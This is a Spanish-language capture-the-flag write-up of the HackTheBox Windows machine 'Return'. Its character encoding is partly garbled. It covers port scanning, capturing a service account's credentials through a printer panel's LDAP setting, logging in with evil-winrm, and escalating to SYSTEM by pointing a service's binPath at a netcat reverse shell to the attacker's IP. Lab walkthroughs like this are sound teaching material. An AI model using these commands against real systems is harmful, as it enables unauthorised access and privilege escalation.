## Introducci贸n
El d铆a de hoy veremos la m谩quina **Return** de la plataforma de HackTheBox. Se trata de una m谩quina Windows de nivel f谩cil que aborda los siguientes conceptos:

- Abusing Printer
- Abusing Server Operators Group
- Service Configuration Manipulation

## Resoluci贸n

# Reconocimiento
Iniciamos el proceso con un escaneo exhaustivo de puertos utilizando `nmap` para identificar los servicios activos en el sistema objetivo:
```bash
nmap -p- --open -sSCV --min-rate 5000 -n -Pn -vvv 10.129.95.241 -oN puertos.txt
```
```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-10-16 11:55:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 33m23s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-10-16T11:56:24
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.26 seconds
```

Identificamos m煤ltiples puertos abiertos caracter铆sticos de un entorno Windows con Active Directory. Los servicios m谩s relevantes para nuestra explotaci贸n son: HTTP (80), SMB (445) y WinRM (5985).

### Puerto 445 - SMB
Utilizando las herramientas `netexec` y `smbmap`, comprobamos el acceso mediante null session sin obtener resultados significativos:

![](../img/6/1.png)

### Puerto 80 - HTTP
Al explorar el puerto 80, nos encontramos con un panel de administraci贸n de impresoras:

![](../img/6/2.png)

Durante la navegaci贸n por las diferentes secciones, observamos un apartado denominado "Settings" que expone la configuraci贸n de conexi贸n de la impresora, incluyendo la direcci贸n del servidor, puerto, usuario y contrase帽a:

![](../img/6/3.png)

Esta funcionalidad presenta una oportunidad para capturar credenciales. Modificamos la direcci贸n del servidor para apuntar a nuestra m谩quina atacante y as铆 interceptar las credenciales de autenticaci贸n.

Nos ponemos en escucha con `netcat` en el puerto 389 (LDAP), que es el protocolo utilizado por defecto para la autenticaci贸n:
```bash
nc -lvnp 389
```

![](../img/6/4.png)

Actualizamos la configuraci贸n en el panel web y recibimos una conexi贸n que expone las credenciales del usuario:

![](../img/6/5.png)

**Credenciales obtenidas:**
- Usuario: `svc-printer`
- Contrase帽a: `1edFg43012!!`

# Explotaci贸n

### Puerto 5985 - WinRM
Como identificamos en el escaneo inicial, el puerto 5985 (WinRM) est谩 abierto. Si el usuario `svc-printer` pertenece al grupo "Remote Management Users", podremos obtener acceso remoto al sistema utilizando las credenciales capturadas.

Utilizamos `evil-winrm` para establecer la conexi贸n:
```bash
evil-winrm -i 10.129.95.241 -u 'svc-printer' -p '1edFg43012!!'
```

![](../img/6/6.png)

Obtenemos acceso exitoso al sistema. La flag de usuario se encuentra en el escritorio del usuario `svc-printer`:

![](../img/6/7.png)

# Escalada de privilegios

Durante la enumeraci贸n de los grupos a los que pertenece el usuario, identificamos su membres铆a en el grupo `Server Operators`:

![](../img/6/8.png)

El grupo **Server Operators** otorga privilegios para administrar servicios del sistema, incluyendo la capacidad de iniciar, detener y modificar servicios. Esto representa un vector de escalada de privilegios, ya que podemos modificar la ruta binaria de un servicio para ejecutar comandos arbitrarios con privilegios SYSTEM.

Para explotar esta configuraci贸n, transferimos `netcat` a la m谩quina v铆ctima:
```bash
upload /usr/share/windows-resources/binaries/nc.exe C:\Users\svc-printer\Desktop\nc64.exe
```

![](../img/6/9.png)

Enumeramos los servicios disponibles en el sistema para identificar un servicio modificable:
```bash
services
```

![](../img/6/10.png)

Procedemos a modificar el servicio `VMTools`, cambiando su ruta binaria para ejecutar una reverse shell con `netcat`:
```bash
sc.exe config VMTools binPath="C:\Users\svc-printer\Desktop\nc64.exe -e cmd 10.10.14.125 9001"
```

![](../img/6/11.png)

Nos ponemos en escucha en nuestra m谩quina atacante:
```bash
nc -lvnp 9001
```

Iniciamos el servicio modificado:
```bash
sc.exe start VMTools
```

Recibimos una shell con privilegios de SYSTEM. La flag de root se encuentra en `C:\Users\Administrator\Desktop\root.txt`.

隆Ya somos administradores! 